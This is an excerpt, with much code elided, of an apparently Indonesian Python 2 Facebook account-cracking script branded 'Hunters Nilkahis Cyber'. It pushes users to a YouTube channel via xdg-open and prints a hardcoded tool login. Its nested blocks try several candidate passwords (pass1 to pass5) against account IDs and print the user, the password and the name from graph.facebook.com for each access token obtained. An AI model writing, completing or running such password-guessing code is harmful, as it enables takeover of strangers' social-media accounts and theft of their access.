...
def an():
    ...
    try:
        ...
        print logo
        time.sleep(1)
        print 'Silahkankan Subscribe ke channell Hunters Nilkahis Cyber !!'
        time.sleep(3)
        print 'Semoga yang subscribe rejekinya banyak Amin...!!'
        time.sleep(3)
        print 'Biasanya yg gak subscribe tidak bisa login'
        time.sleep(3)
        os.system('xdg-open https://www.youtube.com/channel/UCl5K989iHzi4G6MMEJauwtg ')
        print 'User = MHS  dan   Pasw = NILKAHIS '
        time.sleep(5)
        ...
        try:
            ...
            try:
                ...
                if 'access_token' in q:
                    ...
                    z = json.loads(x.text)
                    print '\x1b[1;97m[ \x1b[1;92mDone\x1b[1;97m ] ' + user + '|' + pass1 + ' =>' + z['name']
                    ...
                    if 'access_token' in q:
                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                        z = json.loads(x.text)
                        print '\x1b[1;97m[ \x1b[1;92mDone\x1b[1;97m ] ' + user + '|' + pass2 + ' =>' + z['name']
                        ...
                        if 'access_token' in q:
                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                            z = json.loads(x.text)
                            print '\x1b[1;97m[ \x1b[1;92mDone\x1b[1;97m ] ' + user + '|' + pass3 + ' =>' + z['name']
                            ...
                            if 'access_token' in q:
                                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                z = json.loads(x.text)
                                print '\x1b[1;97m[ \x1b[1;92mDone\x1b[1;97m ] ' + user + '|' + pass4 + ' =>' + z['name']
                                ...
                                if 'access_token' in q:
                                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                    z = json.loads(x.text)
                                    print '\x1b[1;97m[ \x1b[1;92mDone\x1b[1;97m ] ' + user + '|' + pass5 + ' =>' + z['name']
